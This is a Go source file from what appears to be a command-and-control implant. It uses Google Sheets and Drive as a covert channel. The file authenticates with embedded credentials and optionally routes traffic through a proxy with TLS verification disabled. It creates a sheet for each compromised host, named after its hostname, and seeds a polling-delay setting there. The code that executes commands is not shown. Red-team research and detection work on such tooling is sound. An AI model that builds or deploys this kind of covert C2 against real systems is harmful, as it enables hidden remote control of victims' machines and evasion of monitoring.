package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"

	"golang.org/x/oauth2"
	"google.golang.org/api/drive/v3"

	"google.golang.org/api/option"
	"google.golang.org/api/sheets/v4"
	GHTTP "google.golang.org/api/transport/http"
)

type Google struct {
	clientSheet sheets.Service
	clientDrive drive.Service
	spreadSheet spreadSheet
}

type spreadSheet struct {
	DriveId       string
	SpreadSheetId string
	CommandSheet  configuration.Sheet
}

// Creating client for Google Sheet
func AuthenticateSheet() (context.Context, *sheets.Service) {

	ctx, customHTTPClient := customHTTPClient()
	client, err := sheets.NewService(ctx, option.WithHTTPClient(customHTTPClient))
	if err != nil {
		utils.LogFatalDebug("[-] Authentication failed Google Sheet")
	}

	return ctx, client
}

// Creating client for Google Drive
func AuthenticateDrive() (context.Context, *drive.Service) {

	ctx, customHTTPClient := customHTTPClient()
	client, err := drive.NewService(ctx, option.WithHTTPClient(customHTTPClient))
	if err != nil {
		utils.LogFatalDebug("[-] Authentication failed Google Drive")
	}
	return ctx, client
}

// Return custom HTTP Client for oauth and proxy option
func customHTTPClient() (context.Context, *http.Client) {

	proxyUrl := configuration.GetOptionsProxy()

	transport := &http.Transport{}

	if proxyUrl != nil {
		transport.Proxy = http.ProxyURL(proxyUrl)
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}

	ctx := context.Background()
	ctx = context.WithValue(ctx, oauth2.HTTPClient, &http.Client{Transport: transport})

	myTransport, _ := GHTTP.NewTransport(ctx, transport, option.WithScopes(
		"https://www.googleapis.com/auth/drive",
		"https://www.googleapis.com/auth/drive.file",
		"https://www.googleapis.com/auth/drive.readonly",
		"https://www.googleapis.com/auth/spreadsheets",
		"https://www.googleapis.com/auth/spreadsheets.readonly",
	), option.WithCredentialsJSON([]byte(configuration.GetOptionsCredential())))

	return ctx, &http.Client{Transport: myTransport}
}

func GoogleInit() *Google {

	// Perform sheet authentication
	_, clientSheet := AuthenticateSheet()

	// Perform drive authentication
	_, clientDrive := AuthenticateDrive()

	// Create new configuration
	spreadSheet := &spreadSheet{}

	// Set spreadSheet ID
	spreadSheet.SpreadSheetId = configuration.GetOptionsSheetId()

	// Set drive ID
	spreadSheet.DriveId = configuration.GetOptionsDriveId()

	// Get new sheet name to create
	newSheetName := generateNewSheetName()
	// Set sheet name
	spreadSheet.CommandSheet.Name = newSheetName

	// Set default range for the ticker configuration
	spreadSheet.CommandSheet.RangeTickerConfiguration = "E2"

	// Creating new sheet inside spreadsheet on program start
	createSheet(clientSheet, spreadSheet)

	g := &Google{
		clientSheet: *clientSheet,
		clientDrive: *clientDrive,
		spreadSheet: *spreadSheet,
	}

	return g

}
func createSheet(client *sheets.Service, spreadSheet *spreadSheet) {

	sheetName := spreadSheet.CommandSheet.Name

	var requests []*sheets.Request

	request := &sheets.Request{}
	addSheetRequest := &sheets.AddSheetRequest{}
	sheetProperties := &sheets.SheetProperties{Title: sheetName}

	addSheetRequest.Properties = sheetProperties
	request.AddSheet = addSheetRequest
	requests = append(requests, request)

	batchupDateSpreadSheetRequest := &sheets.BatchUpdateSpreadsheetRequest{Requests: requests}

	responseBatchUpdate, err := client.Spreadsheets.BatchUpdate(spreadSheet.SpreadSheetId, batchupDateSpreadSheetRequest).Do()

	if err != nil || responseBatchUpdate == nil {
		utils.LogFatalDebug("Error creating new sheet: " + err.Error())
	}

	writeRange := fmt.Sprintf("%s!D2:%s", sheetName, spreadSheet.CommandSheet.RangeTickerConfiguration)
	writeData := [][]interface{}{{"Delay configuration (sec)", configuration.DefaultTickerDuration}}

	var valueRange = &sheets.ValueRange{
		Range:  writeRange,
		Values: writeData,
	}

	responseValueUpdate, err := client.Spreadsheets.Values.Update(spreadSheet.SpreadSheetId, writeRange, valueRange).ValueInputOption("RAW").Do()
	if err != nil || responseValueUpdate == nil {
		utils.LogFatalDebug("Error writing default configuration: " + err.Error())
	}

}

func generateNewSheetName() string {

	currentTime := time.Now()

	currentTimeS := currentTime.Format("02-01-2006")

	unixString := strconv.FormatInt(currentTime.Unix(), 10)

	hostname, err := os.Hostname()
	if err != nil {
		return fmt.Sprintf("%s-%s", currentTime, unixString[len(unixString)-5:])
	}

	return fmt.Sprintf("%s-%s-%s", currentTimeS, hostname, unixString[len(unixString)-5:])

}
